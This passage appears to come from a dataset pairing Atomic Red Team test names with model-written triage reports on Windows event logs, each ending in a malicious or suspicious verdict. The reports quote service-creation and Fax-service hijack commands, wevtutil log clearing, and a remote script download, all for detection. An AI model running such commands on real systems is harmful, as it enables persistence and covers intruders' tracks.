  - Conduct a thorough investigation to identify the entry point and potential compromise vector.
  - Review and reset credentials for the user `admin_test`, considering potential credential compromise.
  - Restore cleared logs if possible from backups or take steps to increase logging security in future configurations.

- **Incident Response:**
  - Perform a forensic analysis on the server to understand the scope and intent of the compromise.
  - Search for indicators of persistent threats (e.g., unexpected scheduled tasks, startup items, registry changes).

- **Preventative Measures:**
  - Implement stricter access control policies and ensure all security patches are up to date.
  - Enable enhanced logging and monitoring of administrative actions across the network."
EXO - Full access mailbox permission granted to a user,"### Detailed Analysis

Upon reviewing the provided logs from the Windows host, several concerning activities indicate possible malicious behavior:

1. **Event Log Cleared Activity:**
   - In the **Security Log**, Event ID `1102` indicates that the ""Security"" log was cleared by the user `admin_test`. This is often indicative of an attempt to cover tracks after performing unauthorized or malicious activities.
   - Corresponding entries in the **Sysmon Log** show `wevtutil.exe` being used to clear logs in the ""Sysmon"", ""Application"", ""System"", and ""Windows PowerShell"" channels (Process ID `2532`), at around the same time (`2024-10-24 11:02:58 - 11:03:06`). This further reinforces that logs were deliberately cleared, which is suspicious.

2. **Unusual PowerShell Command Execution:**
   - In the **PowerShell Log**, we observe the execution of a PowerShell script that involves connecting to Exchange Online (`Connect-ExchangeOnline`) using stored credentials. This script attempts to grant mailbox permissions (`Add-MailboxPermission`) to another user (`operator@contoso.com`). While such behavior might be part of legitimate administrative activities, the simultaneity with log clearing is concerning.
   - The command uses a plaintext password converted into a secure string, followed by a credential object creation. This pattern can suggest misuse, especially in combination with unauthorized log clearing.

3. **Process Creation Events:**
   - Multiple entries in the **Sysmon Log** depict the creation and usage of `wevtutil.exe` and `conhost.exe` processes with elevated privileges (IntegrityLevel: High) by the user `admin_test`. The frequency and timing coincide with the clearing of multiple event logs, strongly suggesting that these processes were used for this purpose.

4. **Other Command Executions:**
   - Execution of `whoami.exe` and `hostname.exe` was observed, which can be regular commands to gather system info. However, their execution amidst other suspicious activities might indicate reconnaissance attempts or the user verifying access.

### Assessment

The activities outlined above present indications of potentially malicious behavior on the system in question. The sequence of actions -- clearing event logs, executing PowerShell scripts with sensitive operations, and multiple privileged process executions -- suggests an attempt to carry out unauthorized actions and evade detection by clearing audit trails.

### Identified Risks/Threats
- The unauthorized granting of additional mailbox permissions could lead to information theft.
- Clearing logs can indicate a breach or internal misuse, potentially leading to broader access control issues.
- The pattern of activities suggests possible insider threats or compromised accounts/scripts being used to manipulate system environments.

### Resolution

Given the evidence of multiple logs being cleared, the deliberate execution of potentially harmful PowerShell commands, and the timing alignment of suspicious process executions:

**MALICIOUS** - The logs contain indications of activities consistent with malicious intent or compromise.

### Recommendations and Guidance
1. **Immediate Actions:**
   - Isolate the host `Server002` to prevent further unauthorized actions.
   - Conduct a thorough account audit on `admin_test` to confirm if there’s any irregular external activity or unauthorized access.
   - Check for any further log manipulation or suspicious behaviors on other systems within the network.

2. **Follow-Up:**
   - Perform a comprehensive forensic analysis of `Server002` to determine the full extent and intent of the activities.
   - Review Exchange Online activities and configurations for broader exposure or misconfigurations.
   - Evaluate current monitoring, detection, and security policies to prevent future incidents. 

3. **Enhance Monitoring:**
   - Implement stricter logging and alert mechanisms, especially around privileged user activities and PowerShell script executions.
   - Consider deploying solutions that offer advanced threat detection (e.g., EDR) for better visibility into suspicious activities."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"Upon analyzing the given Windows event logs, I have identified a few noteworthy events that appear suspicious:

1. **Log Clearing**: 
   - Multiple instances of `wevtutil.exe` being executed to clear specific Windows Event Logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs. Specifically, the entries with `wevtutil.exe cl <log name>` are indications that logs are being cleared. In the System log, corresponding events (EventID `104`) indicate the event logs were explicitly cleared.

2. **Unusual Process Executions and Command Lines**:
   - A `PowerShell` process was started with the command `""powershell.exe"" & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.012\bin\x64\CreateProcessWithPipe.exe -program \""C:\\Windows\\System32\\werfault.exe\"" -debug}`. This command suggests execution via a potentially malicious tool located in a temporary directory. The usage of `PowerShell` in this manner can be indicative of script-based attacks or offensive framework use (e.g., testing tools similar to Atomic Red Team). 
   - The `CreateProcessWithPipe.exe` program within a PowerShell script indicates an attempt to execute a process with possibly elevated or hidden privileges using `werfault.exe`, a legitimate Windows error reporting executable as a cover.
  
3. **Time Discrepancies**:
   - There are kernel and security events indicating a change in the system time (`EventID` 4616 in the Security log). The alteration of system time could hinder log analysis and potentially bypass time-based security mechanisms.

Based on these observations, the activity noted in the logs suggests deliberate attempts to cover tracks and possibly prepare the system for further unauthorized actions. The clearing of logs, use of PowerShell with suspicious command-line arguments, and system time modification are strong indicators of potentially malicious behavior.

**Assessment**: The logs show clear signs of an intrusion or misuse, characterized by intentional log clearance, suspicious command executions, and system manipulations.

**Resolution: MALICIOUS** - The observed events strongly suggest malicious activity. Immediate incident response actions are recommended, including:
- Isolating the affected host to prevent further network dissemination.
- Performing a comprehensive forensic analysis to uncover additional artifacts.
- Reviewing and restoring the system to a known good state.
- Assessing other systems for similar indicators of compromise.
- Strengthening log monitoring and implementing alert mechanisms for similar future activities."
Service Installation CMD,"### Detailed Log Analysis

Upon reviewing the provided event logs from the Windows host, several areas of interest indicate potentially malicious activity:

1. **Process Activity and Command Execution:**
   - The `cmd.exe` process is observed executing with the command line containing `sc.exe` commands to create and start a service named `AtomicTestService_CMD` running `AtomicService.exe` from a suspicious temporary directory path:
     ```
     ""cmd.exe"" /c sc.exe create AtomicTestService_CMD binPath= ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe"" start=auto  type=Own & sc.exe start AtomicTestService_CMD
     ```
   - This activity is often associated with persistence methods where malicious actors create and start services to maintain access.

2. **Service Installation:**
   - The `Sysmon` logs show an entry for the creation of a service named `AtomicTestService_CMD` using the image path specified above. This is confirmed in the `System` logs with a Service Control Manager event indicating:
     ```
     ServiceName: AtomicTestService_CMD
     ImagePath: C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe
     ```
   - The use of an auto-start service in a temporary directory is unconventional and suspicious, especially under the `LocalSystem` account.

3. **Event Log Clearing:**
   - Multiple logs indicate that event logs for `System`, `Windows PowerShell`, and `Security` channels were cleared by the user `admin_test`. Event ID 104 in the `System` and `Security` logs is indicative:
     ```
     LogFileCleared by admin_test
     ```
   - Clearing logs is a common tactic by attackers to erase their tracks after performing malicious activities.

4. **Elevation of Privileges:**
   - Processes are executed with `High` or `System` integrity levels, particularly `AtomicService.exe` as `NT AUTHORITY\SYSTEM`, suggesting access to high privilege levels, potentially indicative of privilege escalation attempts.

### Assessment

Based on the observed activities - the creation of suspicious services, execution of binaries from non-standard locations, and the clearing of event logs - this behavior is indicative of a potential security breach.

### Conclusion

- **Resolution: MALICIOUS**

The logs exhibit clear signs of malicious activity involving efforts to establish persistence through unauthorized service creation and execution, coupled with log clearing to obscure actions. It is advised to perform an immediate security response to contain and remediate any potential threats.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further malicious activity.
   - Conduct a full malware scan on the isolated machine and review the `AtomicService.exe` for any malicious payloads.
   - Investigate the `admin_test` account's activities and credentials to determine if they have been compromised.

2. **Further Investigation:**
   - Analyze other event logs for similar activities on other hosts in the network.
   - Check for any unauthorized network connections or data exfiltration incidents.

3. **Remediation:**
   - Remove any unauthorized services and executables identified during the investigation.
   - Strengthen security measures, such as user privileges, endpoint protection systems, and network monitoring."
Process Hollowing using PowerShell,"### Detailed Analysis of Provided Logs

**Suspicious Activities and Indicators of Malicious Behavior:**

1. **Event Log Clearing:**
   - **Security Log Clearing:** Event ID 1102 in the Security log indicates that the security log was cleared by the user `admin_test`. This is typically considered suspicious behavior as clearing event logs can be an attempt to cover tracks.
   - **System Log Clearing:** Event ID 104 shows similar clearing activities for the System and Windows PowerShell logs by the same user, `admin_test`. The execution of `wevtutil.exe` found in the Sysmon logs corroborates this activity. Frequent log clearing, especially close in time, is a red flag indicating potential malicious intent.

2. **High Privilege Access:**
   - **Privileged Logon:** Event ID 4672 indicates that the user `admin_test` logged on with special privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeImpersonatePrivilege`. Such privileges allow for potentially malicious activities, including debugging and manipulating processes, which are often associated with malware execution.

3. **Abnormal PowerShell Usage:**
   - **Script Execution:** The PowerShell logs reveal that a script, `Start-Hollow.ps1`, was executed. This script is located in a path under `AtomicRedTeam`, which is a known repository for cybersecurity testing tools. The script's purpose, as indicated by the command line, involves process hollowing, specifically targeting `notepad.exe` to inject `cmd.exe`. This behavior matches known offensive techniques and is highly suspicious.

4. **Process Hollowing Attempt:**
   - **Detailed in PowerShell Command:** The PowerShell command executed from `Start-Hollow.ps1` is designed to perform process hollowing, a technique where a legitimate process (notepad.exe) is used as a container for executing a different, potentially malicious executable (cmd.exe), which may be used for further malicious actions or to hide the presence of malware.

**Assessment of the Situation:**

- The combination of PowerShell script execution involving process hollowing, log clearing activities, and the use of high privileges are strong indicators of a security incident.
- The presence of ""AtomicRedTeam"" testing tools might suggest an internal security testing exercise, but the combination of activities leans towards unauthorized or malicious actions if not explicitly sanctioned.

**Resolution: MALICIOUS**

**Guidance and Next Steps:**

1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent lateral movement and further escalation of potential malicious activities.

2. **Forensic Analysis:**
   - Perform a deep forensic investigation on the affected system to identify additional artifacts such as other malware, misconfigurations, or unauthorized changes.

3. **Incident Response:**
   - Engage the incident response team to coordinate further investigation, communication, and containment efforts.
   - Verify the activity with responsible teams to rule out sanctioned security testing.

4. **Review and Mitigation:**
   - Conduct a review of user access and privileges, especially for users with admin rights.
   - Enhance logging and monitoring to detect similar activities in the future.
   - Evaluate and strengthen security controls to prevent unauthorized execution and log clearing activities.
   
5. **Communication:**
   - Based on findings, prepare appropriate internal communication and, if necessary, external notifications about the incident's potential impact.

By taking these steps, your organization can respond efficiently to this incident, minimize potential impacts, and strengthen defenses against future occurrences."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"In reviewing the provided Windows event logs, several indicators suggest potentially suspicious activity:

1. **Log Clearing Events**:
    - System logs and the Windows PowerShell logs were cleared by a user named `admin_test`. This action is typically suspicious, especially when done without prior notice or legitimate reason. Log clearing is a common tactic employed by attackers to cover their tracks. (Event IDs: 104, 104, 1102)

2. **Suspicious PowerShell Activity**:
    - A PowerShell script was executed, initiating a process named `RtlCreateUserThread.exe` located in a temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055\\bin\\x64\\`. This directory and process name suggest potential use of an offensive security tool, possibly mimicking Red Team or penetration testing tools. This type of activity is often associated with process injection techniques. (PowerShell log indicates Event ID: 600)

3. **Use of `wevtutil` for Log Clearing**:
    - The command-line `wevtutil.exe cl` was used to clear several logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, `Windows PowerShell`). This tool is regularly used in attempts to remove evidence, contributing to the suspicion. (Sysmon logs indicate Event IDs: 1, 5)

4. **Process Execution**:
    - The presence and use of processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `werfault.exe` could be signs of legitimate administrative tasks, but in the context of cleared logs and unexpected PowerShell commands, they add to the suspicious nature of the activity, potentially pointing to enumeration or privilege escalation attempts.

5. **Time Manipulation**:
    - There are events indicating time modification (`NewTime`, `OldTime`) which can be used for anti-forensic purposes. (Security Event ID: 4616)

6. **Privileges Assigned**:
    - The user `admin_test` is shown to have received high-level privileges, such as SeDebugPrivilege, SeBackupPrivilege, etc., which could provide the capability to perform additional unauthorized activities. (Security Event ID: 4672)

The combination of these factors, especially with the alteration and clearing of logs and the execution of potentially malicious PowerShell commands, strongly suggests that the activities recorded in these logs are not merely benign system operations, but rather have signs of malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate `Server002` to prevent further unauthorized actions.
- Conduct a detailed forensic investigation on the system to understand the extent of the compromise.
- Review user `admin_test`'s actions and access permissions.
- Notify incident response teams and stakeholders.
- Consider resetting credentials and reviewing access policies to prevent future incidents.
- Analyze network traffic from `Server002` for any data exfiltration or command and control activity."
Portable Executable Injection,"Upon analyzing the provided Windows event logs, several behaviors and activities can be highlighted:

1. **Event ID 1102 (Security Log Cleared):** A notable indicator of malicious activity. The security log was cleared by the user `admin_test`. Clearing event logs is a classic tactic used to cover tracks after suspicious or unauthorized actions.

2. **Event ID 104 (System/PowerShell Log Cleared):** The system and Windows PowerShell logs were cleared by the same user within a short time span. This action further suggests attempts to hide activity.

3. **EventID 4672 (Special Privileges Assigned):** The user `admin_test` is granted a set of high-level privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are commonly exploited during privilege escalation or for performing sensitive actions that require elevated permissions.

4. **Suspicious PowerShell Activity:** There are multiple logs indicating the execution of PowerShell scripts, particularly:
   - Use of PowerShell to run `RedInjection.exe`. The path indicates this is part of Atomic Red Team, a toolset often used for adversary simulation and cybersecurity training. However, in a production environment, unauthorized use or an unexplained presence of such tools can indicate a compromise.

5. **Events Corresponding to the Execution of RedInjection.exe:**
   - `RedInjection.exe` is executed, followed by the forced termination of `notepad.exe`. This peculiar sequence suggests testing or malicious use of process manipulation techniques.

6. **Execution of Wevtutil.exe to Clear Event Logs:** 
   - Use of `wevtutil` to clear various event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`), again indicative of attempts to obscure traces of activities.

**Assessment & Resolution:**

The provided logs exhibit clear indicators of potential malicious activity, including log clearing, suspicious privilege escalations, and the execution of known simulation tool components without context. These activities warrant serious concern for a potential system compromise or insider action mimicking adversary tactics.

Final Resolution: **MALICIOUS**

**Guidance:**
- Immediate response should include isolating the affected Windows host (`Server002`) for further forensic analysis.
- Security teams should conduct a root cause analysis to determine the extent of potential compromise.
- Review and potentially update security policies to monitor and alert on log clearing and high-level privilege assignments.
- Verify any legitimate need for the Atomic Red Team tools on this server, if any, and restrict their usage to a controlled environment. If unauthorized, consider it an incident and pursue investigations accordingly."
Domain Account and Group Manipulate,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity. Below is a detailed analysis:

1. **Suspicious PowerShell Execution**:
   - There are multiple instances of PowerShell being executed with commands to create Active Directory users and add them to ""Domain Admins"" group:
     - `New-ADUser` and `Add-ADGroupMember` commands are being used with generated usernames (e.g., `atr--xyz`) and set to disabled.
   - These PowerShell scripts (Event IDs: 17986 and 18011) indicate attempts to manipulate user accounts potentially for privilege escalation or persistence, often seen in attack scenarios.

2. **Event Log Clearing**:
   - Multiple logs such as System, Windows PowerShell, and Security logs are cleared (Event IDs: 104, 1102) by the same user or process, which is often a sign of an attempt to cover tracks after conducting suspicious activities.

3. **Elevated Privileges Activities**:
   - We see multiple instances of wevtutil being used to clear event logs, which aligns with attempts to hide malicious activities.
   - The user ""admin_test"" utilized wevtutil to clear logs, which is unusual outside standard maintenance operations.

4. **Console Host (conhost.exe) Activity**:
   - Conhost (Console Host) being invoked alongside suspicious commands or PowerShell scripts (multiple Event IDs), potentially indicative of command execution or script wrapper activity.

5. **Use of wevtutil**:
   - Instances of `wevtutil` being executed to potentially suppress or manipulate event logs, another tactic commonly used in attacks for evidence removal.

6. **Additional Suspicious Indicators**:
   - Consistent high integrity level executions and actions taken by a user account ""SERVER002\\admin_test"" who might have had administrative privileges.

**Resolution**: MALICIOUS

**Threats Identified**:
- Unauthorized account creation and escalation of privileges through Active Directory.
- Log clearing and manipulation indicating potential cover-up of illegal activities or track hiding.

**Guidance on How to Proceed**:
- Immediately conduct an incident response protocol, verifying and possibly isolating affected systems.
- Audit all user accounts, especially focusing on newly created or recently modified accounts within the Active Directory.
- Verify identity and activity logs of the ""admin_test"" account and restrict or change its credentials if necessary.
- Implement stricter PowerShell script execution policies and reinforce log monitoring solutions to quickly identify similar patterns in the future.
- Review and potentially restore cleared log data where possible for further investigation and correlation with other activities on the network.

Given the identified behaviors, it is crucial to respond promptly to mitigate further potential breaches or system compromises."
UUID custom process Injection,"After a detailed analysis of the provided Windows event logs, several indicators suggest potentially malicious activity or at least highly suspicious behavior warranting further investigation:

1. **PowerShell Activity:**
   - Multiple PowerShell commands were executed, specifically involving `powershell.exe` with command lines that reference an executable file (`uuid_injection.exe`) located in a temporary folder (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64`). Usage of `Start-Process`, followed by `Start-Sleep`, and a process termination (`Get-Process -Name Notepad | Stop-Process -Force`) are unusual and suspicious.
   - The use of `AtomicRedTeam`, known for adversary simulation and emulation, indicates that some form of penetration testing or attack simulation may have occurred. This does not immediately signal a real threat but needs context such as whether this is typically allowable in the network.

2. **Event Log Clearing:**
   - The `wevtutil` tool was used to clear event logs, as indicated by the `eventlog` entries. The clearance of three logs (System, Security, and Windows PowerShell) by the same user (`admin_test`) suggests an attempt to cover tracks, which is a common post-exploitation activity.

3. **Sysmon Activity:**
   - There are several instances of `conhost.exe` and `wevtutil.exe` being executed. `conhost.exe` is a legitimate process but can be leveraged in process injection and other forms of obfuscation.
   - A suspicious executable, `uuid_injection.exe`, was executed from the temp directory, and this would typically not occur under normal circumstances, especially if the binary is unknown or unverified.

4. **Security Log Analysis:**
   - A security event (`4624`) indicates a log-on which may be related to SYSTEM processes. Multiple privileged operations and impersonation tokens were listed in the logs.

5. **Security Log Clearing:**
   - Notably, security logs (EventID: 1102) were cleared by the same account (`admin_test`), further reinforcing potential malicious intent through log tampering.

Given these observations, the logs indicate activities that are consistent with both legitimate penetration testing exercises and potential malicious actions if conducted unauthorized. To determine the resolution:

**Resolution: SUSPICIOUS**

- **Further Investigation Required:**
  - Verify if Atomic Red Team's use aligns with authorized penetration testing.
  - Confirm authorization of the `admin_test` user's actions, especially regarding event log clearance.
  - Conduct a threat hunt for any residual signs of compromise related to the suspicious executable (`uuid_injection.exe`) and any processes or services it may have engaged with.

**Guidance:**
- It is critical to initiate a thorough review involving checking permissions, verifying anomaly reports, and ensuring a secure baseline across systems.
- If it turns out the activities were not authorized, immediate containment and remediation steps should be taken to secure the affected systems and prevent further unauthorized access."
Azure AD - adding service principal to Azure AD role,"After carefully analyzing the provided log entries from the Windows event logs, a series of potentially suspicious activities stand out:

1. **Log Clearing Events:**
   - The logs indicate multiple log-clearing activities:
     - Event IDs from the System and Security logs (`EventID: 1102` for Security log, `EventID: 104` for System logs). These actions were performed by a user identified as `admin_test`.

2. **PowerShell Activity:**
   - The PowerShell logs and Sysmon logs reveal that a PowerShell script was executed:
     - The script included commands to connect to Azure Active Directory (`Connect-AzureAD`) and manipulate directory roles.
     - The use of `ConvertTo-SecureString` with passwords in plain text and operations on Azure AD suggest a higher level of activity which may be unauthorized.
   - PowerShell can be a legitimate administration tool, but it is also commonly used by malicious actors to execute scripts.

3. **Command-Line Interface Usage:**
   - The use of `wevtutil.exe` to clear event logs (System, Windows PowerShell) is a notable red flag. This executable is often used to hide traces of malicious activity.
   
4. **Clear Indicators of Malicious Actions:**
   - The sequential clearing of event logs using `wevtutil.exe` while a PowerShell script purporting to access and modify Azure Active Directory roles runs is very suspicious.
   - Typically, clearing logs is associated with threat actors attempting to cover their tracks after performing unauthorized actions on a system.

Overall, the combination of these activities suggests a concentrated effort to perform potentially unauthorized actions, alter Azure AD settings, and remove traces from System and Security logs. Based on these findings and the pattern of active log clearance, it appears there is an attempt at evasion and concealment, which are strong indicators of malicious intent.

**Assessment: MALICIOUS**
- The observed actions suggest intentional log clearance and potentially unauthorized PowerShell script execution, which align with common attack techniques.
- Immediate investigation and containment measures should be initiated to prevent further unauthorized activities and to understand the impact on the system and network resources.

**Recommended Actions:**
1. **Isolate the affected system** from the network to prevent further unauthorized access.
2. **Perform a forensic analysis** to determine the origin of the activity and whether further systems are compromised.
3. **Review Azure AD logs** for any unauthorized activities or unauthorized access.
4. **Notify security operations team** to increase monitoring of network traffic for any related suspicious activities.
5. **Implement security measures** to prevent such attacks, including disabling unnecessary PowerShell capabilities or further restricting its execution through GPO.
6. **Change all credentials** that might have been exposed or used during the incident."
Domain Password Policy Check: Only Two Character Classes,"**Analysis of Logs:**

1. **Application Logs:**
   - No significant anomalies found in the application logs. The Windows Defender status appears active.

2. **PowerShell Logs:**
   - The logs indicate the execution of a PowerShell script that interacts with credential files (saves, compares, and changes passwords).
   - The script seems to attempt changing the Active Directory password for the current user under certain conditions.
   - Host application was `powershell.exe` which aligns with typical execution but simultaneous interaction with user credentials is often a red flag, especially if it's unauthorized or unexpected.

3. **Security Logs:**
   - Event ID 1102 indicates that the security log was cleared, which is a significant red flag as it could suggest an attempt to erase evidence of activity.
   - Multiple Event ID 4624 (successful logon), and Event ID 4672 (special privileges assigned) are observed for the SYSTEM account. This activity is typical for background system operations but combined with clearing of event logs can indicate suspicious activity.
   - Frequent requests for user group membership information (Event ID 4798) logged for various system accounts. While these could be routine, in the context of the security log clearing, these should be examined further.

4. **System Logs:**
   - Events indicate clearing of System logs which pair with the security logs being cleared by the same user (`admin_test`).
   - Typical system maintenance activities are logged, but the manual clearing of logs could indicate malicious behavior trying to remove evidence.

5. **Sysmon Logs:**
   - Various processes executed, including PowerShell instances which match the entries in the PowerShell logs.
   - Event ID 1 and 5 logs show processes such as `wevtutil.exe` (used to clear logs) being executed by `admin_test`, further supporting suspicious activity.
   - The use of `wevtutil.exe` to clear logs is a known tactic for covering tracks after engaging in potentially malicious activities.

**Conclusion:**
- **Indicators of Malicious Activity:**
  - Security and System logs being cleared by user `admin_test` strongly indicate an attempt to hide activity.
  - PowerShell scripts attempting to manipulate credentials should be investigated further.
  - Frequent querying of user group memberships and assignment of elevated privileges in the security log immediately after logs are cleared.
  
**Assessments and Risks:**
- The conduct of clearing logs along with suspicious PowerShell scripting warrants a strong suspicion of malicious intent, where the user may have engaged in unauthorized activity and then attempted to hide their tracks.

**Recommended Actions:**
- Immediate investigation into the `admin_test` user's activities and intentions.
- Review and possibly disable the credentials used to log into the system by `admin_test`.
- Implement increased monitoring on sensitive accounts and employ more restrictive logging policies to prevent future occurrences.

**Resolution:**
- **MALICIOUS** - The logs exhibit indicators consistent with malicious activity, such as log tampering and suspicious credential handling, requiring further investigation and potentially urgent action."
PowerShell Registry RunOnce,"Upon reviewing the provided event logs, certain entries stand out as indicators of potentially malicious activity:

1. **Event Log Cleared**: 
   - **Security Event ID 1102** and **System Event ID 104** indicate that the event log was cleared by the user 'admin_test'. Clearing logs can often be an attempt to cover up unauthorized or malicious activity.

2. **Suspicious Privileges Granted**:
   - Multiple **Security Event ID 4672** entries show that the user 'admin_test' was granted a series of high-level privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges can be leveraged for malicious activities such as debugging system processes or taking ownership of system files.

3. **Suspicious Process Execution**:
   - **Sysmon Event ID 1** logs indicate the execution of `wevtutil.exe` with a command to clear specific event logs, which is suspicious when combined with the log-clearing events. 
   - A critical log entry involves the execution of `powershell.exe` using a command that downloads content from a URL (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`). This script execution over the internet leads to potential malicious activity, as it involves scripts from a repository known for adversary tactics, techniques, and procedures testing.

4. **Windows PowerShell Activity**:
   - The **Windows PowerShell logs** also show the execution of a command aiming to download and execute a remote script, which further corroborates potentially unauthorized activities.

### Assessment:
The combination of the cleared event logs, the granting of high-level privileges, and the execution of a suspicious PowerShell command suggest a high likelihood of malicious activity. The actions shown in the logs are consistent with typical tactics used by adversaries to maintain access and evade detection.

### Resolution: MALICIOUS

### Guidance:
- Immediate incident response measures should be taken. This includes isolating the system from the network, capturing memory and disk images for forensic analysis, and performing a comprehensive examination of the system for persistence mechanisms and other indicators of compromise.
- Conduct a review of user access permissions, especially for the user 'admin_test', to ensure no unnecessary privileges are granted.
- Consider reviewing logs from other systems within the same network for similar suspicious activities, as it might be part of a broader attack."
Modify BootExecute Value,"After analyzing the provided Windows event logs, I have identified several instances of potentially malicious or suspicious behavior that warrant further examination. Here's a detailed analysis of the logs:

### 1. Windows PowerShell Log Analysis:
- **Command Execution:** The PowerShell commands logged involve a script attempting to back up the registry key and modify the ""BootExecute"" registry value. The use of a temporary path resembling `AtomicRedTeam` is indicative of a possible execution of a known attack simulation framework, which may simulate techniques used by adversaries.
- **Registry Manipulation:** Modifying the ""BootExecute"" value could potentially be used for persistence by an attacker. This indicates the possibility of a compromise or at least an unauthorized change intended to affect boot-time processes.

### 2. Security Log Analysis:
- **Event ID 1102 (Log Cleared):** The security log indicates that the event logs were cleared (`EventID: 1102`). This is a known tactic by attackers to cover their tracks after unauthorized activities.
- **Time Change (Event ID 4616):** There are events indicating a system time modification, which is often a sign of attempt to manipulate time-based logs or settings.

### 3. Sysmon Log Analysis:
- **Process Activity:** Multiple instances of `wevtutil.exe` command-line utility are executed to clear specific event logs: ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Windows PowerShell"", and ""Security"". This supports log tampering activity.
- **Automation and Scripting Tools:** The use of `conhost.exe` and PowerShell suggests possible automation and scripting activity that might be linked to malicious actions.

### 4. System Log Analysis:
- Similarly to the security event log, the system logs have also been cleared. This reinforces the hypothesis of malfeasance and an attempt to hide actions.

### 5. Application Log Analysis:
- **Expected Events:** The logs here show expected service stop actions related to Microsoft Edge Update. While benign on their own, their timing coincides with other suspicious activities.
  
### Conclusion and Next Steps:
The patterns seen here, particularly the log clearing events, registry manipulations, and possible use of attack simulation frameworks, are strongly suggestive of malicious activity. 

**Resolution:** **MALICIOUS**

### Recommendations:
- **Immediate Investigation:** Conduct a thorough investigation on the server `Server002` to understand the scope and extent of the compromise. 
- **Isolation:** If possible, isolate the server from the network to prevent any further potential spread.
- **System Restore and Validation:** Consider restoring the system from a known good backup, and validate configurations against known good baselines.
- **Forensic Analysis:** Conduct detailed forensic analysis to identify the root cause, entry method, and any other affected systems.
- **Log Monitoring:** Increase the monitoring and retention policies of logs to ensure ample data is available for future investigations. 

It's crucial to identify any external communication that may have been established during this timeframe, and if detected, block such communication and gather contextual data regarding these activities."
Modify Fax service to run PowerShell,"After reviewing the provided logs from the Windows host, several potential indicators of compromise or anomalous activities are noteworthy:

1. **Event Log Clearing**:
   - The logs indicate several occurrences of event logs being cleared (`EventID 1102` in Security log and `EventID 104` in System log). These actions were performed by the user ""admin_test"". Clearing or manipulating event logs can be considered an indicator of malicious activity, as it may be an attempt to erase tracks of an intrusion or unauthorized activities.

2. **Unusual Command Execution**:
   - The Sysmon log entries show the execution of `cmd.exe` with a command that modifies the configuration of the Fax service (Service Control Manager entries), redirecting it to run a PowerShell script. The command used (`sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\"""" & sc start Fax`) is a strong indicator of potential privilege escalation or backdoor setup. This is aligned with the MITRE ATT&CK technique T1543.003 for “Windows Service”. 

3. **Service Start Failure Logs**:
   - The System log entries (`EventID 7000` and `EventID 7009`) record failures related to the Fax service start, which corresponds with the aforementioned command execution attempting to start PowerShell under the pretense of the Fax service. This further corroborates the suspicion of service abuse.

4. **Scheduled Task or Maintenance Activities**:
   - Multiple executions of the `wevtutil.exe` utility are recorded. While this utility is legitimate and used for managing event logs, its frequent execution right before logs are cleared could suggest an attempt to manipulate or examine the system logs to cover up malicious activities.

5. **Edge Browser Update Activities**:
   - There are numerous entries for Microsoft Edge Update processes being executed. While these entries alone are not necessarily malicious, given the context of suspicious activities, it's important to check whether these processes and their updates are legitimate or possibly tampered.

Based on the analysis of the logs, the activity recorded is significantly suspicious and aligns with known malicious techniques such as log clearing, service abuse, and command-line obfuscation.

**Assessment: MALICIOUS**

**Guidance on how to proceed:**
1. **Immediate Response**: Disconnect the affected machine from the network to prevent further compromise.
2. **Containment**: Investigate and stop the malicious service configurations and any scheduled tasks or processes that could allow attacker persistence.
3. **Forensic Review**: Conduct a deeper forensic analysis of the machine for other indicators of compromise that may not be in the provided logs.
4. **Recovery and Remediation**: Reimage the compromised system if necessary, and apply patches and security updates.
5. **Monitoring and Alerts**: Strengthen monitoring, particularly around log clearing activities and service misconfigurations, and enhance alerting for similar suspicious activities in the future."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"After analyzing the provided Windows event logs, a few events stand out as suspicious:

1. **PowerShell Logging and Behavior**:
   - The PowerShell logs indicate the execution of a script that employs `Start-Process` to initiate `werfault.exe` and subsequently executes `CreateRemoteThreadNative.exe`. This behavior is highly indicative of process injection, a common technique used in attacks aiming to evade detection by security measures. The path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe` suggests the presence of tools used for testing security detections, often associated with the Atomic Red Team, a known repository for testing cybersecurity defenses.

2. **Event Logs Clearing**:
   - There are multiple instances of the `wevtutil.exe` utility being used to clear logs (`EventID 104` in the System log), which is a known technique attackers use to cover their tracks after conducting malicious activities.

3. **Security Privileges**:
   - The Security logs show `EventID 4672` for reserved system privileges like `SeDebugPrivilege`, which allows a user or process to bypass certain security restrictions—a capability often leveraged for privilege escalation or lateral movement in an attack scenario.

Having assessed the events collectively, the combination of suspicious PowerShell activity, event log clearing, and elevated security privileges align with potential malicious techniques often observed in compromise attempts.

**Resolution**: **MALICIOUS**

**Recommended Actions**:
- Immediately isolate the machine from the network to prevent further potential malicious activities.
- Conduct a thorough forensic investigation on the machine to identify any other indicators of compromise.
- Review any other systems or logs for similar activities to ensure the attack is contained.
- Enhance monitoring on the network and improve PowerShell logging to capture more detailed execution data.
- Conduct a security awareness session to remind users and administrators of best practices and the importance of detecting unusual activities."
